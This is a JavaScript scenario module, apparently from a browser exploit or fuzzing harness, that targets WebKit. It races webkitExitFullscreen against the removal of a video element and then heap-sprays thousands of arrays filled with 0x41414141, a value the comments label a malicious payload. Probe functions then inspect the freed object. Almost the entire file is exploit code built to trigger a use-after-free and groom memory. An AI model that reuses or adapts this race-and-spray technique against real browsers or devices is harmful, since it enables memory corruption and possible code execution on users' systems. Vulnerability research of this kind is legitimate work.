/**
 * CENÁRIO: VIDEO_FULLSCREEN_REMOVE (Teardown Race)
 * Alvo: Race condition entre webkitExitFullscreen e video.remove()
 */

export default {
    id:       'VIDEO_FULLSCREEN_REMOVE',
    category: 'Media',
    risk:     'CRITICAL',
    description: 'Inverte a lógica para evitar o Soft Brick: Inicia a saída do Fullscreen (exit) ' +
                 'e destrói o objeto (remove + spray) no milissegundo exato em que o Manx tenta limpar a tela.',

    setup: async function() {
        this.container = document.createElement('div');
        document.body.appendChild(this.container);
        this.video = document.createElement('video');
        this.video.src = 'data:video/mp4;base64,AAAAFGZ0eXBtcDQyAAAAAG1wNDIAAAAIZnJlZQAAAAhtZGF0';
        this.video.controls = true; // Necessário para algumas lógicas nativas
        this.container.appendChild(this.video);

        // O nosso payload malicioso (Ponteiros 0x41414141 = "AAAA")
        this.sprayPayload = new Uint32Array(256);
        this.sprayPayload.fill(0x41414141);

        await new Promise(resolve => {
            const timeout = setTimeout(resolve, 400);
            this.video.addEventListener('loadedmetadata', () => {
                clearTimeout(timeout);
                resolve();
            }, { once: true });
        });
    },

    trigger: async function() {
        try {
            // 1. Entramos em Fullscreen nativo
            if (this.video.webkitEnterFullscreen) {
                this.video.webkitEnterFullscreen();
            } else if (this.video.webkitRequestFullscreen) {
                this.video.webkitRequestFullscreen();
            }
            
            await new Promise(r => setTimeout(r, 200)); // Aguarda estabilizar

            // 2. INICIA A SAÍDA (O Manx começa a desconstruir a tela)
            if (document.webkitExitFullscreen) {
                document.webkitExitFullscreen();
            } else if (this.video.webkitExitFullscreen) {
                this.video.webkitExitFullscreen();
            }

            // 3. A CORRIDA (Race): Destruímos o vídeo ANTES do Manx terminar a saída!
            this.video.remove();

            // 4. SPRAY: Preenchemos a memória a jato
            this.spray = [];
            for (let i = 0; i < 5000; i++) {
                let arr = new Uint32Array(256);
                arr.set(this.sprayPayload);
                this.spray.push(arr);
            }

        } catch(e) {}
    },

    probe: [
        s => s.video.readyState,
        s => s.video.webkitDecodedFrameCount,
        s => { try { return s.video.buffered.start(0); } catch(e) { return e.name; } }
    ],

    cleanup: function() {
        try { this.container.remove(); } catch(e) {}
        this.spray = null;
    }
};
